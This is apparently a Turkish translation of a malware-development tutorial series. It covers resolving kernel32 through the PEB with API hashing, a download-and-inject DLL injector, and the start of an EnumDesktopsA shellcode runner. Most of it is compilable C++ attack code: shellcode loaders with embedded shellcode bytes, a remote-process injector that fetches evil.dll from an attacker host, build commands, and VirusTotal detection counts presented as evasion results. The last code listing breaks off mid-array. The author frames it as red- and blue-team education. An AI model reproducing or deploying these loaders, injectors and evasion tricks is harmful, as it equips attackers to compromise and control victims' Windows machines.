Daha sonra, shellcode'u yürütmenin asıl yolu aşağıdaki gibi bir şeydir (meow.cpp):
#include <windows.h>

LPVOID (WINAPI * pVirtualAlloc)(
LPVOID lpAddress, SIZE_T dwSize,
DWORD flAllocationType, DWORD flProtect);

unsigned char my_payload[] =
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";
int main() {
	HMODULE hk32 = GetModuleHandle("kernel32.dll");
	pVirtualAlloc = GetProcAddress(hk32, "VirtualAlloc");
	PVOID lb = pVirtualAlloc(0, sizeof(my_payload),
	MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memcpy(lb, my_payload, sizeof(my_payload));
	HANDLE th = CreateThread(0, 0,
	(PTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
	WaitForSingleObject(th, -1);
}
Bu kod, payload'u yürütmek için çok basit bir mantık içeriyor. Bu durumda, basitlik adına 'meow-meow' mesaj kutusu payload'u kullanılıyor.
Hadi bunu derleyelim:
x86_64-w64-mingw32-g++ meow.cpp -o meow.exe \
-mconsole -I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-Wint-to-pointer-cast -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive


++++++++++++++++++++++++++++++++
Ve çalıştıralım:
++++++++++++++++++++++++++++++++
GetModuleHandle İşlevini kullanarak kernel32.dll'in bellekteki yerini bulduk. Ancak bu işlemi PEB içinde kütüphane konumunu bularak da gerçekleştirmek mümkündür.

Assembly Tarzı :)

Önceki bölümlerin birinde TEB ve PEB yapıları hakkında yazmıştım ve kernel32'yi assembly ile bulmuştum. Elde edilen sonuçlar şunlardı:  

	1. PEB yapısının ofseti 0x030'dur.  
	2. PEB içindeki LDR'nin ofseti 0x00c'dir.
	3. InMemoryOrderModuleList'in ofseti 0x014'dür.
	4. 1. yüklü modül bizim .exe'mizdir.
	5. 2. yüklü modül ntdll.dll'dir.
	6. 3. yüklü modül kernel32.dll'dir.  
	7. 4. yüklü modül kernelbase.dll'dir.

Bugün x64 mimarisini ele alacağım. Bu durumda ofsetler farklıdır: 

	1.PEB adresi GS kaydına göre nispi bir adreste bulunur: GS:[0x60]
	2. PEB içindeki LDR'nin ofseti 0x18'dir.
	3.kernel32.dll taban adresi 0x10'dadır.

Pratik Örnek

Hadi inceleyelim:

static HMODULE getKernel32(DWORD myHash) {
	HMODULE kernel32;
	INT_PTR peb = __readgsqword(0x60);
	auto modList = 0x18;
	auto modListFlink = 0x18;
	auto kernelBaseAddr = 0x10;

	auto mdllist = *(INT_PTR*)(peb + modList);
	auto mlink = *(INT_PTR*)(mdllist + modListFlink);
	auto krnbase = *(INT_PTR*)(mlink + kernelBaseAddr);
	auto mdl = (LDR_MODULE*)mlink;
	do {
		mdl = (LDR_MODULE*)mdl->e[0].Flink;
		if (mdl->base != nullptr) {
			if (calcMyHashBase(mdl) == myHash) { // kernel32.dll hash
				break;
}
		}
	} while (mlink != (INT_PTR)mdl);

	kernel32 = (HMODULE)mdl->base;
	return kernel32;
}
Daha sonra GetProcAddress ve GetModuleHandle'ı bulmak için, önceki yazımdaki getAPIAddr işlevimi kullandım:

static LPVOID getAPIAddr(HMODULE h, DWORD myHash) {
	PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
	PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)(
		(LPBYTE)h + img_dos_header->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
		(LPBYTE)h +
		img_nt_header->
		OptionalHeader.
		DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].
		VirtualAddress);
	PDWORD fAddr = (PDWORD)(
		(LPBYTE)h + img_edt->AddressOfFunctions);
	PDWORD fNames = (PDWORD)(
		(LPBYTE)h + img_edt->AddressOfNames);
	PWORD fOrd = (PWORD)(
		(LPBYTE)h + img_edt->AddressOfNameOrdinals);
	for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
		LPSTR pFuncName = (LPSTR)(
		(LPBYTE)h + fNames[i]);

		if (calcMyHash(pFuncName) == myHash) {
			printf("successfully found! %s - %d\n",
			pFuncName, myHash);
			return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
		}
	}
	return nullptr;
}

Ve buna bağlı olarak, main() işlevinin mantığı farklıdır:

int main() {
	HMODULE mod = getKernel32(56369259);
	fnGetModuleHandleA myGetModuleHandleA =
	(fnGetModuleHandleA)getAPIAddr(mod, 4038080516);
fnGetProcAddress myGetProcAddress =
	(fnGetProcAddress)getAPIAddr(mod, 448915681);

	HMODULE hk32 = myGetModuleHandleA("kernel32.dll");
	fnVirtualAlloc myVirtualAlloc =
	(fnVirtualAlloc)myGetProcAddress(
		hk32, "VirtualAlloc");
	fnCreateThread myCreateThread =
	(fnCreateThread)myGetProcAddress(
		hk32, "CreateThread");
	fnWaitForSingleObject myWaitForSingleObject =
	(fnWaitForSingleObject)myGetProcAddress(
		hk32, "WaitForSingleObject");
	PVOID lb = myVirtualAlloc(0, sizeof(my_payload),
	MEM_COMMIT | MEM_RESERVE,
	PAGE_EXECUTE_READWRITE);
	memcpy(lb, my_payload, sizeof(my_payload));
	HANDLE th = myCreateThread(NULL, 0,
	(PTHREAD_START_ROUTINE)lb, NULL, 0, NULL);
	myWaitForSingleObject(th, INFINITE);
}
Gördüğünüz gibi, Win32 API çağrısını hash trick yöntemiyle kullandım.
İşte tam kaynak kodu (hack.cpp):
/*
* hack.cpp - find kernel32 from PEB,
assembly style. C++ implementation
* @cocomelonc
* https://cocomelonc.github.io/tutorial/
2022/04/02/malware-injection-18.html
*/
#include <windows.h>
#include <stdio.h>

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING;

struct LDR_MODULE {
	LIST_ENTRY e[3];
	HMODULE base;
	void* entry;
	UINT size;
	UNICODE_STRING dllPath;
	UNICODE_STRING dllname;
};

typedef HMODULE(WINAPI *fnGetModuleHandleA)(
	LPCSTR lpModuleName
);

typedef FARPROC(WINAPI *fnGetProcAddress)(
	HMODULE hModule,
	LPCSTR lpProcName
);

typedef PVOID(WINAPI *fnVirtualAlloc)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD flAllocationType,
	DWORD flProtect
);

typedef PVOID(WINAPI *fnCreateThread)(
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	SIZE_T dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID lpParameter,
	DWORD dwCreationFlags,
	LPDWORD lpThreadId
);

typedef PVOID(WINAPI *fnWaitForSingleObject)(
	HANDLE hHandle,
	DWORD dwMilliseconds
);

DWORD calcMyHash(char* data) {
	DWORD hash = 0x35;
	for (int i = 0; i < strlen(data); i++) {
		hash += data[i] + (hash << 1);
	}
	return hash;
}

static DWORD calcMyHashBase(LDR_MODULE* mdll) {
	char name[64];
	size_t i = 0;

	while (mdll->dllname.Buffer[i] && i < sizeof(name) - 1) {
		name[i] = (char)mdll->dllname.Buffer[i];
		i++;
	}
	name[i] = 0;
	return calcMyHash((char *)CharLowerA(name));
}

static HMODULE getKernel32(DWORD myHash) {
	HMODULE kernel32;
	INT_PTR peb = __readgsqword(0x60);
	auto modList = 0x18;
	auto modListFlink = 0x18;
	auto kernelBaseAddr = 0x10;
	auto mdllist = *(INT_PTR*)(peb + modList);
	auto mlink = *(INT_PTR*)(mdllist + modListFlink);
	auto krnbase = *(INT_PTR*)(mlink + kernelBaseAddr);
	auto mdl = (LDR_MODULE*)mlink;
	do {
		mdl = (LDR_MODULE*)mdl->e[0].Flink;
		if (mdl->base != nullptr) {
			if (calcMyHashBase(mdl) == myHash) { // kernel32.dll hash
				break;
			}
		}
	} while (mlink != (INT_PTR)mdl);

	kernel32 = (HMODULE)mdl->base;
	return kernel32;
}

static LPVOID getAPIAddr(HMODULE h, DWORD myHash) {
	PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
	PIMAGE_NT_HEADERS img_nt_header =
	(PIMAGE_NT_HEADERS)(
	(LPBYTE)h + img_dos_header->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
	(LPBYTE)h +
	img_nt_header->
	OptionalHeader.
	DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].
	VirtualAddress);
	PDWORD fAddr = (PDWORD)(
	(LPBYTE)h + img_edt->AddressOfFunctions);
	PDWORD fNames = (PDWORD)(
	(LPBYTE)h + img_edt->AddressOfNames);
	PWORD fOrd = (PWORD)(
	(LPBYTE)h + img_edt->AddressOfNameOrdinals);
	for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
		LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);
		if (calcMyHash(pFuncName) == myHash) {
			printf("successfully found! %s - %d\n",
			pFuncName, myHash);
			return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
		}
	}
	return nullptr;
}

unsigned char my_payload[] =
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";
int main() {
	HMODULE mod = getKernel32(56369259);
	fnGetModuleHandleA myGetModuleHandleA =
	(fnGetModuleHandleA)getAPIAddr(mod, 4038080516);
	fnGetProcAddress myGetProcAddress =
	(fnGetProcAddress)getAPIAddr(mod, 448915681);

	HMODULE hk32 = myGetModuleHandleA("kernel32.dll");
	fnVirtualAlloc myVirtualAlloc =
	(fnVirtualAlloc)myGetProcAddress(
	  hk32, "VirtualAlloc");
	fnCreateThread myCreateThread =
	(fnCreateThread)myGetProcAddress(
	  hk32, "CreateThread");
	fnWaitForSingleObject myWaitForSingleObject =
	(fnWaitForSingleObject)myGetProcAddress(
	  hk32, "WaitForSingleObject");

	PVOID lb = myVirtualAlloc(0, sizeof(my_payload),
	MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(lb, my_payload, sizeof(my_payload));
	HANDLE th = myCreateThread(NULL, 0,
	(PTHREAD_START_ROUTINE)lb, NULL, 0, NULL);
	myWaitForSingleObject(th, INFINITE);
}
Gördüğünüz gibi, aynı hash algoritmasını kullandım.

Demo

Haydi bunu derleyelim:

x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -Wint-to-pointer-cast \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

++++++++++++++++++++++++++++++++
Ve çalıştırıyoruz (kurbanın Windows 10 x64 makinesinde):
.\hack.exe
++++++++++++++++++++++++++++++++
Gördüğünüz gibi, her şey mükemmel bir şekilde çalıştı :)
Şimdi dosyamızı VirusTotal'a yükleyelim:
++++++++++++++++++++++++++++++++
https://www.virustotal.com/gui/file/0f5204336b3250fe2756b0a675013099be58f99a
522e3e14161c1709275ec2d5/detection

Sonuç olarak, 69 antivirüs motorundan 6 tanesi dosyamızı zararlı olarak algıladı.
Bu numaralar, zararlı yazılımımızın statik analizini biraz daha zorlaştırmak için kullanılabilir, özellikle PE formatı ve yaygın göstergelere odaklanarak.
Bu numarayı Conti fidye yazılımının kaynak kodunda gördüm.
Umarım bu bölüm, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.
PEB structure(https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)
TEB structure(https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-teb)
PEB_LDR_DATA structure(https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data)
GetModuleHandleA(https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea)
GetProcAddress(https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)
windows shellcoding - part 1(https://cocomelonc.github.io/tutorial/2021/10/27/windows-shellcoding-1.html)
windows shellcoding – find
kernel32(https://cocomelonc.github.io/tutorial/2021/10/30/windows-shellcoding-2.html)
Conti ransomware source code(/investigation/2022/03/27/malw-inv-conti-1.html)
Github’taki kaynak kod: https://github.com/cocomelonc/2022-04-02-malware-injection-18

32. Zararlı Yazılım Geliştirme Tüyoları. İndir ve Enjekte Mantığı. C++ Örneği.

﷽

++++++++++++++++++++++++++++++++
Bu yazı, gerçek hayattaki zararlı yazılımlarda kullanılan ilginç bir numara üzerine yaptığım kendi araştırmaların bir sonucudur.

İndir ve Çalıştır

İndir ve çalıştır ya da bizim durumumuzda indir ve enjekte et, ilginç bir numara olup, bir URL'den payload ya da zararlı DLL indirip, bunu çalıştırmak ya da enjekte etmek için tasarlanmıştır.İndir/çalıştır (veya indir/enjekte et) yaklaşımının avantajı, yalnızca HTTP dışında tüm trafiği filtreleyen ağların arkasında kullanılabilmesidir. Hatta, kimlik doğrulama bilgisi gerektirmeyen bir proxy kullanılıyorsa, önceden yapılandırılmış bir proxy üzerinden bile çalışabilir.

Pratik Örnek

İlk olarak, klasik DLL enjeksiyonu zararlı yazılımını ele alalım. En basit durumda şu şekilde görünecektir:

/*
* classic DLL injection example
* author: @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

char evilDLL[] = "C:\\evil.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

int main(int argc, char* argv[]) {
	HANDLE ph; // process handle
	HANDLE rt; // remote thread
	LPVOID rb; // remote buffer

	HMODULE hKernel32 = GetModuleHandle("Kernel32");
	VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");

	// parse process pid
	if ( atoi(argv[1]) == 0) {
		printf("PID not found :( exiting...\n");
	return-1;
	}
	printf("PID: %i", atoi(argv[1]));
	ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE,
	DWORD(atoi(argv[1])));
	rb = VirtualAllocEx(ph, NULL, evilLen,
	(MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);
	rt = CreateRemoteThread(ph, NULL, 0,
	(LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
	CloseHandle(ph);
	return 0;
}

Gördüğünüz gibi, oldukça basit.
Burada, zararlı evil.dll dosyamızı indirmek için bazı basit bir mantık eklemek istiyorum. En basit durumda şu şekilde görünecektir:
// download evil.dll from url
char* getEvil() {
	HINTERNET hSession = InternetOpen((LPCSTR)"Mozilla/5.0",
	INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET hHttpFile = InternetOpenUrl(hSession,
	(LPCSTR)"http://192.168.56.1:4444/evil.dll",
	0, 0, 0, 0);
	DWORD dwFileSize = 1024;
	char* buffer = new char[dwFileSize + 1];
	DWORD dwBytesRead;
	DWORD dwBytesWritten;
	HANDLE hFile = CreateFile("C:\\Temp\\evil.dll",
	GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ,
	NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	do {
		buffer = new char[dwFileSize + 1];
		ZeroMemory(buffer, sizeof(buffer));
		InternetReadFile(hHttpFile, (LPVOID)buffer,
		dwFileSize, &dwBytesRead);
		WriteFile(hFile, &buffer[0], dwBytesRead,
		&dwBytesWritten, NULL);
		delete[] buffer;
		buffer = NULL;
	} while (dwBytesRead);

	CloseHandle(hFile);
	InternetCloseHandle(hHttpFile);
	InternetCloseHandle(hSession);
	return buffer;
}
Bu işlev, saldırganın makinesinden (192.168.56.1:4444, ancak gerçek hayatta bu evilmeowmeow.com:80 gibi görünebilir) evil.dll dosyasını indirir ve C:\\Temp\\evil.dll dosyasına kaydeder.
Daha sonra, bu kodu main() işlevinde çalıştırıyoruz. Enjektörümüzün tam kaynak kodu şu şekildedir:
/*
evil_inj.cpp
classic DLL injection example
author: @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <wininet.h>
#pragma comment (lib, "wininet.lib")

char evilDLL[] = "C:\\Temp\\evil.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

// download evil.dll from url
char* getEvil() {
	HINTERNET hSession = InternetOpen((LPCSTR)"Mozilla/5.0",
	INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET hHttpFile = InternetOpenUrl(hSession,
	(LPCSTR)"http://192.168.56.1:4444/evil.dll",
	0, 0, 0, 0);
	DWORD dwFileSize = 1024;
	char* buffer = new char[dwFileSize + 1];
	DWORD dwBytesRead;
	DWORD dwBytesWritten;
	HANDLE hFile = CreateFile("C:\\Temp\\evil.dll",
	GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ,
	NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	do {
		buffer = new char[dwFileSize + 1];
		ZeroMemory(buffer, sizeof(buffer));
		InternetReadFile(hHttpFile, (LPVOID)buffer,
		dwFileSize, &dwBytesRead);
		WriteFile(hFile, &buffer[0], dwBytesRead,
		&dwBytesWritten, NULL);
		delete[] buffer;
		buffer = NULL;
	} while (dwBytesRead);
		CloseHandle(hFile);
		InternetCloseHandle(hHttpFile);
		InternetCloseHandle(hSession);
		return buffer;
}

// classic DLL injection logic
int main(int argc, char* argv[]) {
	HANDLE ph; // process handle
	HANDLE rt; // remote thread
	LPVOID rb; // remote buffer

	// handle to kernel32 and pass it to GetProcAddress
	HMODULE hKernel32 = GetModuleHandle("Kernel32");
	VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");
	char* evil = getEvil();

	// parse process ID
	if ( atoi(argv[1]) == 0) {
		printf("PID not found :( exiting...\n");
		return-1;
	}
	printf("PID: %i\n", atoi(argv[1]));
	ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE,
	DWORD(atoi(argv[1])));

	// allocate memory buffer for remote process
	rb = VirtualAllocEx(ph, NULL, evilLen,
	(MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

	// "copy" evil DLL between processes
	WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);

	// our process start new thread
	rt = CreateRemoteThread(ph, NULL, 0,
	(LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
	CloseHandle(ph);
	return 0;
}

Her zamanki gibi, basitlik adına, sadece bir mesaj kutusu açan bir DLL oluşturuyoruz:

/*
evil.cpp
simple DLL for DLL inject to process
author: @cocomelonc
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule,
DWORD nReason, LPVOID lpReserved) {
	switch (nReason) {
	case DLL_PROCESS_ATTACH:
		MessageBox(
		NULL,
		"Meow from evil.dll!",
		"=^..^=",
		MB_OK
	);
	break;
case DLL_PROCESS_DETACH:
	break;
case DLL_THREAD_ATTACH:
	break;
case DLL_THREAD_DETACH:
	break;
}
return TRUE;
}
Son olarak, enjektörün tüm kodunu anladıktan sonra, bunu test edebiliriz.
Demo
İlk olarak, DLL'i derleyelim:
x86_64-w64-mingw32-g++ -shared -o evil.dll evil.cpp -fpermissive
++++++++++++++++++++++++++++++++
Daha sonra, enjektörü derleyin:
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -mconsole \
-lwininet -I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
++++++++++++++++++++++++++++++++

Saldırganın makinesinde basit bir web sunucusu hazırlayın:
python3 -m http.server 4444
++++++++++++++++++++++++++++++++

Belirtilen yolun kurbanın makinesinde mevcut olduğundan emin olun (`C:\\Temp`):
++++++++++++++++++++++++++++++++

Son olarak, kurban sürecini (`mspaint.exe`) çalıştırın ve enjektör (`hack.exe`) çalıştırın:  

.\hack.exe <mspaint.exe's PID>

++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++

Gördüğünüz gibi, her şey mükemmel bir şekilde çalıştı :)  

Şimdi dosyamızı VirusTotal'a yükleyelim: 
++++++++++++++++++++++++++++++++
https://www.virustotal.com/gui/file/00e3254cdf384d5c1e15e217e89df9f78b73db7a
2b0d2b7f5441c6d8be804961/detection

Sonuç olarak, 69 antivirüs motorundan 6 tanesi dosyamızı zararlı olarak algıladı. 

Umarım bu bölüm, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler. 

InternetOpen(https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena)
InternetOpenUrl(https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurlw)
InternetReadFile(https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile)
InternetCloseHandle(https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetclosehandle)
WriteFile(https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile)
CreateFile(https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea)
VirtualAllocEx(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
WriteProcessMemory(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
CreateRemoteThread(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
OpenProcess(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)
GetProcAddress(https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)
LoadLibraryA(https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya)
classic DLL injection(https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html)
Github’taki kaynak kod: https://github.com/cocomelonc/2022-04-13-malware-injection-19


33. Zararlı Yazılım Geliştirme Tüyoları. EnumDesktopsA Kullanarak Shellcode Çalıştırma. C++ Örneği.
﷽
++++++++++++++++++++++++++++++++
Bu bölüm, ilginç bir numara üzerine yaptığım araştırmaların bir sonucudur: Shellcode'u masaüstlerini listeleyerek çalıştırmak.
EnumDesktopsA
EnumDesktopsA, çağrı yapan işlemin belirtilen pencere istasyonuyla ilişkili tüm masaüstlerini listeler.Bu işlev, her masaüstünün adını, uygulama tarafından tanımlanan bir geri çağırma işlevine iletir:
BOOL EnumDesktopsA(
HWINSTA hwinsta,
DESKTOPENUMPROCA lpEnumFunc,
LPARAM lParam
);
Pratik Örnek
Hadi, pratik bir örneğe bakalım. Bu numara oldukça basittir:
/*
* hack.cpp - run shellcode via EnumDesktopA.
C++ implementation
* @cocomelonc
* https://cocomelonc.github.io/tutorial/
2022/06/27/malware-injection-20.html
*/
#include <windows.h>

unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
